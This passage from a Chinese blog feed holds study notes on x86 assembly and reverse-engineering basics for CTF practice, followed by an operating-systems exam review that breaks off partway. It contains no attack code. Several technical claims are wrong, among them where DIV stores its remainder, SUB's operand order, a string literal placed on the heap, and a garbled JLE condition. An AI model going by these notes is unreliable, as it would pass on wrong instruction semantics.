src="/2020/01/13/%E6%B1%87%E7%BC%96%E3%80%81%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%9F%BA%E7%A1%80/1565342088084.png" srcset="/img/loading.gif" class="" width="1565342088084"><p>EAX是名字，AX是低16位部分，又分为低8位AL，高8位AH</p><p><strong>了解：</strong></p><p>i.单字节（8位）寄存器：</p><blockquote><ol><li>AL and AH</li><li>BL and BH</li><li>CL and CH</li><li>DL and DH</li></ol></blockquote><p>ii.单字（16位）寄存器：这些寄存器大小为一个字（=2字节=16位）。一个单字寄存器包含两个单字节寄存器。通常根据功能区分</p><p>1.通用寄存器:</p><blockquote><ol><li>AX (单字=16位) = AH + AL -&gt; 其中‘+’号并不代表把它们代数相加。AH和AL寄存器是相互独立的，只不过都是AX寄存器的一部分，所以你改变AH或AL (或者都改变) ，AX寄存器也会被改变。 </li><li>-&gt; ‘accumulator’(累加器)：用于进行数学运算</li><li>BX -&gt; ‘base’(基址寄存器)：用来连接栈(之后会说明)</li><li>CX -&gt; ‘counter’(计数器)：</li><li>DX -&gt; ‘data’(数据寄存器)：大多数情况下用来存放数据</li><li>DI -&gt; ‘destination index’(目的变址寄存器): 例如将一个字符串拷贝到DI</li><li>SI -&gt; ‘source index’(源变址寄存器): 例如将一个字符串从SI拷贝</li></ol></blockquote><p>2.索引寄存器（指针寄存器）:</p><blockquote><ol><li>BP -&gt; ‘base pointer’(基址指针寄存器)：表示栈区域的基地址</li><li>SP -&gt; ‘stack pointer’(栈指针寄存器)：表示栈区域的栈顶地址</li></ol></blockquote><p>3.段寄存器：</p><blockquote><ol><li>CS -&gt; ‘code segment’(代码段寄存器)：用于存放应用程序代码所在段的段基址(之后会说明)</li><li>DS -&gt; ‘data segment’(数据段寄存器)：用于存放数据段的段基址(以后会说明)</li><li>ES -&gt; ‘extra segment’(附加段寄存器)：用于存放程序使用的附加数据段的基地址</li><li>SS -&gt; ‘stack segment’(栈段寄存器)：用于存放栈段的段基址(以后会说明)</li></ol></blockquote><p>4.指令指针寄存器：</p><blockquote><p>IP -&gt; ‘instruction pointer’(指令指针寄存器)：指向下一个指令 ;)</p></blockquote><p>iii. 双字(32位)寄存器：</p><p>2 字= 4 字节= 32 位， EAX、EBX、ECX、EDX、EDI…… </p><p>如果16位寄存器前面加了‘E’，就代表它们是32位寄存器。例如，AX=16位，EAX=32位。</p><h2 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h2><p>32位的CPU中有32个不同的标志寄存器，只关心期中三个：ZF、OF、CF。标志寄存器是一个标志，==只能是0或者1，决定了是否要执行某个指令==，可以知道程序在这一步是否会跳转。</p><h3 id="Z-Flag（零标志）"><a href="#Z-Flag（零标志）" class="headerlink" title="Z-Flag（零标志）"></a>Z-Flag（零标志）</h3><p>ZF是破解中用的最多的寄存器（通常90%）。若上一个运算结果为0，则值为1，否则为0。</p><h3 id="The-O-Flag（溢出标志）"><a href="#The-O-Flag（溢出标志）" class="headerlink" title="The O-Flag（溢出标志）"></a>The O-Flag（溢出标志）</h3><p>OF占约4%，若上一步改变了某寄存器的最高有效位，则会被设置为1。操作产生溢出时也会被设置为1。</p><h3 id="The-C-Flag（进位标志）"><a href="#The-C-Flag（进位标志）" class="headerlink" title="The C-Flag（进位标志）"></a>The C-Flag（进位标志）</h3><p>CF占1%，产生溢出，就会被设置为1。</p><h2 id="段偏移"><a href="#段偏移" class="headerlink" title="段偏移"></a>段偏移</h2><p>内存中的一个段储存了指令（CS）、数据（DS）、堆栈（SS）或者其他段（ES）。每一个段都有一个偏移量，在32位应用程序下，这些偏移量由00000000到FFFFFFFF。段和偏移量的标准形式如下：</p><blockquote><p>段：偏移量 = 把它们放在一起就是内存中一个具体的地址。</p><p>比喻：一个段是一本书的某一页；偏移量是一页的某一行。</p></blockquote><h2 id="堆和栈"><a href="#堆和栈" class="headerlink" title="堆和栈"></a>堆和栈</h2><p><strong>内存中的栈区处于相对较高的地址以地址的增长方向为上的话，栈地址是向下增长的。</strong></p><p>栈中分配局部变量空间，堆区是向上增长的用于分配程序员申请的内存空间。另外还有静态区是分配静态变量，全局变量空间的；只读区是分配常量和程序代码空间的；以及其他一些分区。</p><blockquote><p>PUSH 命令是向栈中压入数据，POP命令就是从栈中取出最后放入的数据并且把它存进具体的寄存器中。</p></blockquote><h3 id="1、堆和栈申请和回收方式不同"><a href="#1、堆和栈申请和回收方式不同" class="headerlink" title="1、堆和栈申请和回收方式不同"></a>1、堆和栈申请和回收方式不同</h3><ul><li>栈：由系统自动分配空间，自动回收</li><li>堆：由程序员自己申请空间，不释放就可以一直访问</li></ul><h3 id="2、申请后系统响应"><a href="#2、申请后系统响应" class="headerlink" title="2、申请后系统响应"></a>2、申请后系统响应</h3><ul><li>栈：只要栈剩余空间,就自动分配空间，否则提示栈溢出</li><li>堆：==操作系统有一个记录空闲内存地址的链表==，系统收到空间申请会遍历该链表，寻找第一个大于申请空间的结点。并将结点从空闲结点链表删除，将空间分配给程序。==在这块内存空间的首地址会记录分配空间的大小，所以delete才能正确释放空间。==多余空间会放回空闲链表。 </li></ul><h3 id="3、堆申请效率比栈低"><a href="#3、堆申请效率比栈低" class="headerlink" title="3、堆申请效率比栈低"></a>3、堆申请效率比栈低</h3><h3 id="4、申请大小的限制"><a href="#4、申请大小的限制" class="headerlink" title="4、申请大小的限制"></a>4、申请大小的限制</h3><ul><li>栈：Win下，栈是==连续的内存区域==，==向低地址扩展的数据结构。栈顶地址和栈的最大容量是系统预先规定好的。==Win下栈大小为1M，申请空间超出剩余会提示overflow。</li><li>堆：向高地址拓展的数据结构，不连续的内存区域。（因为用链表储存）<strong>链表遍历从低地址到高地址。</strong>堆的大小受限于计算机系统中有效的虚拟内存。</li></ul><h3 id="5、堆和栈中的存储内容"><a href="#5、堆和栈中的存储内容" class="headerlink" title="5、堆和栈中的存储内容"></a>5、堆和栈中的存储内容</h3><ul><li>栈大小有限，用子函数有物理意义（？？？）</li><li>栈：调用函数时，第一个进栈的是主函数中函数调用后的下一条指令（下一条可执行语句）==的地址==，然后是函数的各个参数，在大多数C编译器中，参数是由右往左入栈的，然后是函数中的局部变量。==静态变量不入栈。==</li></ul><p>==调用结束后，局部变量先出栈，然后是参数，最后栈顶指向最开始存的地址，也就是主函数中的下一条指令，程序由该点继续运行==</p><ul><li>堆:一般是在堆的头部用一个字节存放堆的大小。堆中具体内容由程序员安排。</li></ul><h3 id="6、存取效率的比较"><a href="#6、存取效率的比较" class="headerlink" title="6、存取效率的比较"></a>6、存取效率的比较</h3><pre><code class="cpp">char s1[] = &quot;aaaaaaaaaaaaaaa&quot;; char *s2 = &quot;bbbbbbbbbbbbbbbbb&quot;; </code></pre><p>aaaaaaaaaaa是在运行时刻赋值的；（字符数组有连续空间存放值）放在栈中。<br>而bbbbbbbbbbb是在编译时就确定的；（只有4字节的空间用于存放地址）放在堆中。<br>==在以后的存取中，在栈上的数组比指针所指向的字符串(例如堆)快==</p><h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><p>==所有值通常以16进制形式储存的。==</p><p>大部分指令有两个操作符（例如add EAX,EBX）,有些是一个（例如not EAX），还有一些是三个操作符（例如IMUL EAX，EDX，64）。如果使用“DWORD PTR [XXX]”就表示使用了内存中偏移量为XXX的数据。<strong>Win+Intel的电脑大多采用“低尾端法”，所以字节在内存中储存方式是倒过来的。</strong></p><blockquote><p>大部分有两个操作符的指令都是以下这种格式（以add举例）</p><pre><code>add eax,ebx                           寄存器, 寄存器add eax,123                           寄存器, 数值add eax,dword ptr [404000]            寄存器, Dword  指针 [数值]add eax,dword ptr [eax]               寄存器, Dword  指针 [寄存器值]add eax,dword ptr [eax+00404000]      寄存器, Dword  指针 [寄存器值+数值]add dword ptr [404000],eax            Dword 指针[数值], 寄存器add dword ptr [404000],123            Dword 指针[数值], 数值add dword ptr [eax],eax               Dword 指针[寄存器值], 寄存器add dword ptr [eax],123               Dword 指针[寄存器值], 数值add dword ptr [eax+404000],eax        Dword 指针[寄存器值+数值], 寄存器add dword ptr [eax+404000],123        Dword 指针[寄存器值+数值], 数值</code></pre></blockquote><h3 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h3><p>ADD 被加数，加数</p><p>将一个数值加在一个寄存器上或者一个内存地址上。</p><p>add eax,123 == eax = eax +123</p><p>加法指令对ZF，OF，CF都有影响</p><h3 id="AND"><a href="#AND" class="headerlink" title="AND"></a>AND</h3><p>AND 目标数，原数</p><p>AND运算对两个数进行逻辑与运算。</p><p>会清空OF,CF标记，设置ZF标记。</p><h3 id="CALL"><a href="#CALL" class="headerlink" title="CALL"></a>CALL</h3><blockquote><p>CALL 404000                 最常见: CALL 地址<br>CALL EAX                    CALL 寄存器 - 如果寄存器存的值为404000，那就等同于第一种情况<br>CALL DWORD PTR [EAX]        CALL [EAX]偏移量所指向的地址<br>CALL DWORD PTR [EAX+5]      CALL [EAX+5]偏移量所指向的地址</p></blockquote><h3 id="CDQ"><a href="#CDQ" class="headerlink" title="==CDQ=="></a>==CDQ==</h3><p>通常出现在除法前面，将EDX的所有位变成EAX最高位的值</p><p>比如当EAX&gt;=80000000h时，其二进制最高位为1，则EDX被32位全赋值为1，即FFFFFFFF</p><p>若EAX&lt;80000000，则其二进制最高位为0，EDX为00000000。</p><p>然后将EDX：EAX组成新数(64位)：FFFFFFFF 80000000</p><h3 id="CMP（compare）"><a href="#CMP（compare）" class="headerlink" title="CMP（compare）"></a>CMP（compare）</h3><p>CMP 目标数，原数</p><p>比较两个值并且标记CF、OF、ZF:</p><blockquote><p>CMP     EAX, EBX               比较eax和ebx是否相等，如果相等就设置ZF为1<br>CMP     EAX,[404000]           比较eax和偏移量为[404000]的值是否相等<br>CMP     [404000],EAX           比较[404000]是否与eax相等</p></blockquote><h3 id="DEC-decrease"><a href="#DEC-decrease" class="headerlink" title="DEC(decrease)"></a>DEC(decrease)</h3><p>DEC something</p><p>自减</p><blockquote><p>dec eax                              eax自减1<br>dec [eax]                            偏移量为eax的值自减1<br>dec [401000]                         偏移量为401000的值自减1<br>dec [eax+401000]                     偏移量为eax+401000的值自减1</p></blockquote><p>可以标记ZF、OF</p><h3 id="DIV（division除）"><a href="#DIV（division除）" class="headerlink" title="DIV（division除）"></a>DIV（division除）</h3><p>DIV 除数</p><p>无符号除法</p><p>DIV指令用来将EAX除以除数（无符号除法），被除数通常是EAX，结果也储存在EAX中，而被除数对除数取的模存在除数中。</p><blockquote><p>mov eax,64                       EAX = 64h = 100<br>mov ecx,9                        ECX = 9<br>div ecx                          EAX除以ECX</p></blockquote><p>EAX = 100/9 = 0B(11)并且ECX = 100 MOD 9 = 1</p><p>可以标记CF、OF、ZF</p><h3 id="IDIV（整除）"><a href="#IDIV（整除）" class="headerlink" title="IDIV（整除）"></a>IDIV（整除）</h3><p>IDIV 除数</p><p>有符号除法</p><p>执行方法同div一样</p><h3 id="INC（increase）"><a href="#INC（increase）" class="headerlink" title="INC（increase）"></a>INC（increase）</h3><p>自加</p><p>可以标记ZF、OF</p><p><strong>INT</strong></p><p>语法: int 目标数</p><p>INT 的目标数必须是产生一个整数(例如：int 21h)，类似于call调用函数，INT指令是调用程序对硬件控制，不同的值对应着不同的功能。</p><p>具体参照硬件说明书。</p><p><strong>JUMPS</strong></p><p>这些都是最重要的跳转指令和触发条件(重要用<em>标记，最重要用*</em>标记)：</p><pre><code>指令                条件                    条件JA*          -    如果大于就跳转(无符号)      - CF=0 and ZF=0JAE          -    如果大于或等于就跳转(无符号)- CF=0JB*          -    如果小于就跳转(无符号)   - CF=1JBE          -    如果小于或等于就跳转(无符号)- CF=1 or ZF=1JC           -    如果CF被标记就了跳转       - CF=1JCXZ         -    如果CX等于0就跳转      - CX=0JE**         -    如果相等就跳转        - ZF=1JECXZ        -    如果ECX等于0就跳转       - ECX=0JG*          -    如果大于就跳转(有符号)   - ZF=0 and SF=OF (SF = Sign Flag)JGE*         -    如果大于或等于就跳转(有符号) - SF=OFJL*          -    如果小于就跳转(有符号)    - SF != OF (!= is not)JLE*         -    如果小于或等于就跳转(有符号 - ZF=1 and OF != OFJMP**        -    跳转             - 强制跳转JNA          -    如果不大于就跳转(无符号)   - CF=1 or ZF=1JNAE         -    如果不大于等于就跳转(无符号) - CF=1JNB          -    如果不小于就跳转(无符号)   - CF=0JNBE         -    如果不小于等于就跳转(无符号) - CF=0 and ZF=0JNC          -    如果CF未被标记就跳转     - CF=0JNE**        -    如果不等于就跳转       - ZF=0JNG          -    如果不大于就跳转(有符号)   - ZF=1 or SF!=OFJNGE         -    如果不大于等于就跳转(有符号) - SF!=OFJNL          -    如果不小于就跳转(有符号)   - SF=OFJNLE         -    如果不小于等于就跳转(有符号) - ZF=0 and SF=OFJNO          -    如果OF未被标记就跳转     - OF=0JNP          -    如果PF未被标记就跳转     - PF=0JNS          -    如果SF未被标记就跳转      - SF=0JNZ          -    如果不等于0就跳转      - ZF=0JO           -    如果OF被标记就跳转     - OF=1JP           -    如果PF被标记就跳转     - PF=1JPE          -    如果是偶数就跳转       - PF=1JPO          -    如果是奇数就跳转       - PF=0JS           -    如果SF被标记就跳转     - SF=1JZ           -    如果等于0就跳转      - ZF=1</code></pre><p><strong>LEA (有效地址传送)</strong></p><p>语法：LEA 目的数、源数</p><p>LEA可以看成和MOV差不多的指令LEA ，它本身的功能并没有被太广泛的使用，反而广泛运用在快速乘法中：</p><p>lea eax，dword ptr [4*ecx+ebx]</p><p>将eax赋值为 4*ecx+ebx</p><p><strong>MOV (传送)</strong></p><p>语法: MOV 目的数,源数</p><p>这是一个很简单的指令，MOV指令将源数赋值给目的数，并且源数值保持不变</p><p>这里有一些MOV的变形：</p><p>MOVS/MOVSB/MOVSW/MOVSD EDI, ESI：这些变形能将ESI指向的内容传送到EDI指向的内容中去</p><p>MOVSX：MOVSX指令将单字或者单字节扩展为双字或者双字节传送，原符号不变</p><p>MOVZX：MOVZX扩展单字节或单字为双字节或双字并且用0填充剩余部分(通俗来说就是将源数取出置于目的数，其他位用0填充)</p><p><strong>MUL (multiply乘法)</strong></p><p>语法：MUL 数值</p><p>这个指令同IMUL一样，不过MUL可以乘无符号数。</p><p><strong>NOP (无操作)</strong></p><p>语法：NOP</p><p>这个指令说明不做任何事</p><p>所以它在逆向中运用范围最广</p><p><strong>OR (逻辑或)</strong></p><p>语法：OR 目的数,源数</p><p>OR指令对两个值进行逻辑或运算</p><p>这个指令会清空OF、CF标记，设置ZF标记</p><p>为了更好的理解OR，思考下面二进制串:</p><pre><code>10010101100101001101</code></pre><p>如果对它们进行逻辑与运算，结果将是1101011111。</p><p>只有当两边同为0时其结果为0，否则就为1。你可以用计算器尝试计算。希望你能理解为什么，最好自己动手算一算</p><p><strong>POP</strong></p><p>语法：POP 目的地址</p><p>POP指令将栈顶第一个字传送到目的地址。 每次POP后，ESP(栈指针寄存器)都会增加以指向新栈顶</p><p><strong>PUSH</strong></p><p>语法：PUSH 值</p><p>PUSH是POP的相反操作，它将一个值压入栈并且减小栈顶指针值以指向新栈顶。</p><p><strong>REP/REPE/REPZ/REPNE/REPNZ</strong></p><p>语法: REP/REPE/REPZ/REPNE/REPNZ ins</p><p>重复上面的指令：直到CX=0。ins必须是一个操作符，比如CMPS、INS、LODS、MOVS、OUTS、SCAS 或 STOS</p><p><strong>RET (return返回)</strong></p><p>语法：RET</p><p>RET digit</p><p>RET指令的功能是从一个代码区域中退出到调用CALL的指令处。</p><p>RET digit在返回前会清理栈</p><p><strong>SUB (减)</strong></p><p>语法：SUB 目的数,源数</p><p>SUB与ADD相反，它将源数减去目的数，并将结果储存在目的数中</p><p>SUB可以标记ZF、OF、CF</p><p><strong>TEST</strong></p><p>语法：TEST 操作符、操作符</p><p>这个指令99%都是用于”TEST EAX, EAX”，它执行与AND相同的功能，但是并不储存数据。如果EAX=0就会标记ZF，如果EAX不是0，就会清空ZF</p><p><strong>XOR</strong></p><p>语法：XOR 目的数,源数</p><p>XOR指令对两个数进行异或操作</p><p>这个指令清空OF、CF，但会标记ZF</p><p>为了更好的理解，思考下面的二进制串：</p><pre><code>10010101100101001101</code></pre><p>如果异或它们，结果将是1100011011</p><p>如果两个值相等，则结果为0，否则为1。</p><p>很多情况下我们会使用”XOR EAX, EAX”，这个操作是将EAX赋值为0，因为当一个值异或其自身，就过都是0。你最好自己动手尝试下，这样可以帮助你理解得更好</p><h3 id="MOV"><a href="#MOV" class="headerlink" title="MOV"></a>MOV</h3><p>==MOV AX , 2000H 将2000H传给AX==</p><h3 id="逻辑操作符"><a href="#逻辑操作符" class="headerlink" title="逻辑操作符"></a>逻辑操作符</h3><img src="/2020/01/13/%E6%B1%87%E7%BC%96%E3%80%81%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%9F%BA%E7%A1%80/Snipaste_2019-08-12_22-36-43.jpg" srcset="/img/loading.gif" class="" title="Snipaste_2019-08-12_22-36-43"><h2 id="MIPS汇编"><a href="#MIPS汇编" class="headerlink" title="MIPS汇编"></a>MIPS汇编</h2><p><a href="https://www.cnblogs.com/thoupin/p/4018455.html" target="_blank" rel="noopener">link</a></p><p>xori 异或</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础知识</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>操作系统复习</title>
    <link href="/2020/01/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0/"/>
    <url>/2020/01/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="对不起我看吐了，考炸了"><a href="#对不起我看吐了，考炸了" class="headerlink" title="对不起我看吐了，考炸了"></a><strong>对不起我看吐了，考炸了</strong></h2><h1 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h1><h2 id="操作系统的目标"><a href="#操作系统的目标" class="headerlink" title="操作系统的目标"></a>操作系统的目标</h2><p><strong>方便性，有效性，可扩充性和开放性</strong></p><p>可扩充性：采用微内核结构 P30</p><h3 id="发展主要动力"><a href="#发展主要动力" class="headerlink" title="发展主要动力"></a>发展主要动力</h3><ul><li>不断提高计算机资源利用率</li><li>方便用户</li><li>器件的更新换代</li><li>体系结构的发展</li><li>新的应用需求</li></ul><h3 id="多道程序设计的基本概念"><a href="#多道程序设计的基本概念" class="headerlink" title="多道程序设计的基本概念"></a>多道程序设计的基本概念</h3><p>利用I/O操作的空闲时间，调度B程序运行，B空闲调度C等    P8</p><h4 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h4><ul><li>资源利用率高</li><li>吞吐量大</li><li>平均周转时间长</li><li>没有交互能力</li></ul><p>==操作系统定义为:一组能有效组织和管理硬件和软件资源，合理进行调度，方便用户使用程序的集合==</p><h3 id="分时系统（The-Sharing-System）"><a href="#分时系统（The-Sharing-System）" class="headerlink" title="分时系统（The Sharing System）"></a>分时系统（The Sharing System）</h3><p>在一台主机上连接多个终端，允许多个用户同时通过终端以交互方式使用计算机，共享主机资源</p><h4 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h4><ul><li>多路性</li><li>独立性</li><li>及时性</li><li>交互性</li></ul><h2 id="基本特性"><a href="#基本特性" class="headerlink" title="基本特性"></a>基本特性</h2><p><strong>有并发，共享，虚拟，异步四个基本特征</strong></p><h3 id="并行与并发"><a href="#并行与并发" class="headerlink" title="并行与并发"></a>并行与并发</h3><p>并行：多个程序同时执行</p><p>并发：分时交替执行（为主）</p><h4 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h4><p>指在系统中可以独立运行并且是资源分配的基本单元</p><h3 id="共享"><a href="#共享" class="headerlink" title="共享"></a>共享</h3><p>互斥共享方式和同时访问方式</p><h3 id="虚拟"><a href="#虚拟" class="headerlink" title="虚拟"></a>虚拟</h3><p>（没有那么多但感觉有那么多）</p><ul><li>时分复用技术    （空闲时给其他用户服务</li><li>空分复用技术    （储存器空闲时存储和运行程序</li></ul><h3 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h3><p>（同时开始，不同时结束）</p><p>进程以不可预知的速度进行</p><h2 id="存储器管理功能"><a href="#存储器管理功能" class="headerlink" title="存储器管理功能"></a>存储器管理功能</h2><ul><li>内存分配</li><li>内存保护</li><li>地址映射</li><li>内存扩充</li></ul><h2 id="OS结构设计"><a href="#OS结构设计" class="headerlink" title="OS结构设计"></a>OS结构设计</h2><p>第一代无结构OS，第二代模块化OS，第三代分层式OS</p><h1 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h1><h2 id="进程-1"><a href="#进程-1" class="headerlink" title="进程"></a>进程</h2><p>PCB进程控制块（Process Control Block）</p><p>定义：</p><ul><li>进程的程序的一次执行</li><li>进程是一个程序及其数据 顺序执行的活动</li><li>进程是系统进行资源分配的独立单元</li></ul><h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><ul><li>动态性</li><li>并发性</li><li>独立性</li><li>异步性</li></ul><h2 id="进程状态转换"><a href="#进程状态转换" class="headerlink" title="进程状态转换"></a>进程状态转换</h2><p>==P42-43==</p><h2 id="操作系统内核"><a href="#操作系统内核" class="headerlink" title="操作系统内核"></a>操作系统内核</h2><p>处理机两种执行状态：系统态和用户态</p><h2 id="进程同步"><a href="#进程同步" class="headerlink" title="进程同步"></a>进程同步</h2><h3 id="临界资源-生产者消费者问题"><a href="#临界资源-生产者消费者问题" class="headerlink" title="临界资源-生产者消费者问题"></a>临界资源-生产者消费者问题</h3><h3 id="设置临界区"><a href="#设置临界区" class="headerlink" title="设置临界区"></a>设置临界区</h3><ul><li>进入区 判断资源是否被访问</li><li>临界区</li><li>退出区 将正被访问标志恢复为未被访问</li><li>剩余区</li></ul><h3 id="同步规则"><a href="#同步规则" class="headerlink" title="同步规则"></a>同步规则</h3><ul><li>空闲让进</li><li>忙则等待</li><li>有限等待 有限时间内能访问</li><li>让权等待 不能进入则释放处理机</li></ul><h2 id="利用信号量实现进程互斥"><a href="#利用信号量实现进程互斥" class="headerlink" title="利用信号量实现进程互斥"></a>利用信号量实现进程互斥</h2><p>设mutex为互斥信号量，=1都未进入临界区，=0有一个进入运行，另一阻塞。= -1有一正在运行，另一等待。</p><h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p>调度和分派的基本单位，能独立运行的基本单位</p><p>切换时仅保存和设置少量寄存器内容，切换代价远低于进程</p><h1 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h1><h2 id="处理机调度层次"><a href="#处理机调度层次" class="headerlink" title="处理机调度层次"></a>处理机调度层次</h2><h3 id="高级调度"><a href="#高级调度" class="headerlink" title="高级调度"></a>高级调度</h3><p>调度对象是作业，多用于多道批处理</p><h3 id="低级调度"><a href="#低级调度" class="headerlink" title="低级调度"></a>低级调度</h3><p>决定就绪队列哪个进程获得处理机</p><h3 id="中级调度"><a href="#中级调度" class="headerlink" title="中级调度"></a>中级调度</h3><p>提高内存利用率和系统吞吐量（把暂时不运行的进程调至外存，此时进程状态为就绪/挂起状态）</p><h2 id="公式"><a href="#公式" class="headerlink" title="公式"></a>公式</h2><h3 id="CPU利用率"><a href="#CPU利用率" class="headerlink" title="CPU利用率"></a>CPU利用率</h3><p>CPU利用率 = CPU有效工作时间/(CPU有效工作时间 + CPU空闲等待时间)</p><h3 id="平均周转时间"><a href="#平均周转时间" class="headerlink" title="平均周转时间"></a>平均周转时间</h3><p>T = 1/n(T1+T2 ······ +Tn)</p><h3 id="平均带权周转时间"><a href="#平均带权周转时间" class="headerlink" title="平均带权周转时间"></a>平均带权周转时间</h3><p>W = 1/n(作业周转时间Ti/提供服务Ts + ······ ) i=1,2,3,4…..</p><h3 id="系统吞吐量大"><a href="#系统吞吐量大" class="headerlink" title="系统吞吐量大"></a>系统吞吐量大</h3><p>与作业平均长度有关，单纯提高吞吐量可选择多的短作业运行</p><h2 id="分时系统目标"><a href="#分时系统目标" class="headerlink" title="分时系统目标"></a>分时系统目标</h2><ul><li>响应时间快</li><li>均衡性（相应快慢和请求的复杂性相适应）</li></ul><h2 id="实时系统目标"><a href="#实时系统目标" class="headerlink" title="实时系统目标"></a>实时系统目标</h2><ul><li>截止时间的保证</li><li>可预测性</li></ul><h2 id="作业调度算法"><a href="#作业调度算法" class="headerlink" title="作业调度算法"></a>作业调度算法</h2><h3 id="FCFS（First-Come-First-Server）先来先服务"><a href="#FCFS（First-Come-First-Server）先来先服务" class="headerlink" title="FCFS（First Come First Server）先来先服务"></a>FCFS（First Come First Server）先来先服务</h3><h3 id="SJF-Short-Job-First-短作业优先"><a href="#SJF-Short-Job-First-短作业优先" class="headerlink" title="SJF (Short Job First) 短作业优先"></a>SJF (Short Job First) 短作业优先</h3><h3 id="PSA-Priority-Scheduling-Algorithm-优先级调度算法"><a href="#PSA-Priority-Scheduling-Algorithm-优先级调度算法" class="headerlink" title="PSA (Priority-Scheduling Algorithm) 优先级调度算法"></a>PSA (Priority-Scheduling Algorithm) 优先级调度算法</h3><p>基于作业紧迫程度</p><h3 id="HRRN-Highest-Response-Ratio-Next-高响应比优先调度算法"><a href="#HRRN-Highest-Response-Ratio-Next-高响应比优先调度算法" class="headerlink" title="HRRN (Highest Response Ratio Next) 高响应比优先调度算法"></a>HRRN (Highest Response Ratio Next) 高响应比优先调度算法</h3><p>优先权 = (等待时间 + 要求服务时间) / 要求服务时间</p><h3 id="RR-Round-Robin-基于时间片的轮转调度算法"><a href="#RR-Round-Robin-基于时间片的轮转调度算法" class="headerlink" title="RR ( Round Robin) 基于时间片的轮转调度算法"></a>RR ( Round Robin) 基于时间片的轮转调度算法</h3><h3 id="EDF-Earliest-Deadline-First-最早截止时间优先算法"><a href="#EDF-Earliest-Deadline-First-最早截止时间优先算法" class="headerlink" title="EDF (Earliest Deadline First) 最早截止时间优先算法"></a>EDF (Earliest Deadline First) 最早截止时间优先算法</h3><h3 id="LLF-Least-Laxity-First-最低松弛度算法"><a href="#LLF-Least-Laxity-First-最低松弛度算法" class="headerlink" title="LLF (Least Laxity First) 最低松弛度算法"></a>LLF (Least Laxity First) 最低松弛度算法</h3><p>松弛度 = (必须完成时间 - 本身运行时间 - 当前时间)</p><h2 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>一组进程中每一个进程都在等待只有其他进程才能引发的时间</p><h3 id="必要条件"><a href="#必要条件" class="headerlink" title="必要条件"></a>必要条件</h3><ul><li>互斥条件</li><li>请求和保持条件</li><li>不可抢占条件</li><li>循环等待条件</li></ul><h2 id="银行家算法-P121"><a href="#银行家算法-P121" class="headerlink" title="银行家算法 P121"></a>银行家算法 P121</h2><p>判断 需求是否小于等于需要的</p><p>判断 需要是否小于等于可用的</p><p>模拟分配并检测是否有安全序列</p><h1 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a>第四章</h1><h2 id="磁盘缓存"><a href="#磁盘缓存" class="headerlink" title="磁盘缓存"></a>磁盘缓存</h2><p>在内存中暂存磁盘中读出的数据</p><h2 id="固定分区分配"><a href="#固定分区分配" class="headerlink" title="固定分区分配"></a>固定分区分配</h2><ul><li><p>相等 </p></li><li><p>不相等 建立表，记录分区信息</p></li></ul><h2 id="动态分区分配"><a href="#动态分区分配" class="headerlink" title="动态分区分配"></a>动态分区分配</h2><p>常见数据结构:</p><ul><li>空闲分区链</li><li>空闲分区表</li></ul><h2 id="空闲分区分配算法"><a href="#空闲分区分配算法" class="headerlink" title="空闲分区分配算法"></a>空闲分区分配算法</h2><h3 id="FF-First-Fit-首次适应"><a href="#FF-First-Fit-首次适应" class="headerlink" title="FF (First Fit) 首次适应"></a>FF (First Fit) 首次适应</h3><p>从头找，找到空间再划分内存给作业</p><h3 id="NF-Next-fit-循环首次适应"><a href="#NF-Next-fit-循环首次适应" class="headerlink" title="NF (Next fit) 循环首次适应"></a>NF (Next fit) 循环首次适应</h3><p>从上一次查找到的空闲区的下一个开始查找</p><h3 id="BF-Best-Fit-最佳适应算法"><a href="#BF-Best-Fit-最佳适应算法" class="headerlink" title="BF (Best Fit) 最佳适应算法"></a>BF (Best Fit) 最佳适应算法</h3><p>把能满足要求、最小的空闲区分配，但碎片很多</p><h3 id="WF-Worst-Fit-最坏适应算法"><a href="#WF-Worst-Fit-最坏适应算法" class="headerlink" title="WF (Worst Fit)最坏适应算法"></a>WF (Worst Fit)最坏适应算法</h3><p>总挑选最大的空闲区进行分配</p><p>优点 剩下的空闲区不至于太小 查找效率高</p><h2 id="分页储存"><a href="#分页储存" class="headerlink" title="分页储存"></a>分页储存</h2><h3 id="分页储存-1"><a href="#分页储存-1" class="headerlink" title="分页储存"></a>分页储存</h3><h4 id="页面和物理块"><a href="#页面和物理块" class="headerlink" title="页面和物理块"></a>页面和物理块</h4><p>用户程序的地址空间分为若干区域，成为页。</p><p>内存中同样划分，成为块</p><p>地址结构：</p><p>高20位 页号 低12位 位偏移量</p><h4 id="页表"><a href="#页表" class="headerlink" title="页表"></a>页表</h4><p>记录页在内存中对应的物理块号</p><h2 id="分段管理"><a href="#分段管理" class="headerlink" title="分段管理"></a>分段管理</h2><p>编程需要：</p><ul><li>信息共享</li><li>信息保护</li><li>动态增长</li><li>动态链接</li></ul><p>作业地址被分为多个段，所以呈现出二维特性</p><p>分段地址：</p><p>高16位 段号 低16位 段内地址</p><h3 id="段表"><a href="#段表" class="headerlink" title="段表"></a>段表</h3><p>各个段离散的放入内存不同分区中，需要为每个进程建立段映射表</p><p>实现从逻辑段到物理内存区的映射</p><h1 id="第五章"><a href="#第五章" class="headerlink" 